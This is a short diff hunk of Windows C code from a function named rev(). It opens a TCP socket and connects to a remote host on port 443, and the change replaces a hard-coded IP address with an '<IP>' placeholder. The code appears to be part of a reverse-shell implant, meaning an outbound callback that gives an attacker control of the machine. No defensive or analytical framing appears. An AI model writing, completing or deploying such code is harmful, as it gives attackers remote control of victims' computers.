@@ -9,7 +9,7 @@ void rev(){
     SOCKET sock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
     if(sock != INVALID_SOCKET){
         struct sockaddr_in addr = {
-            .sin_addr.s_addr = inet_addr("45.62.229.15"),
+            .sin_addr.s_addr = inet_addr("<IP>"),
             .sin_family = AF_INET,
             .sin_port = htons(443)
         };
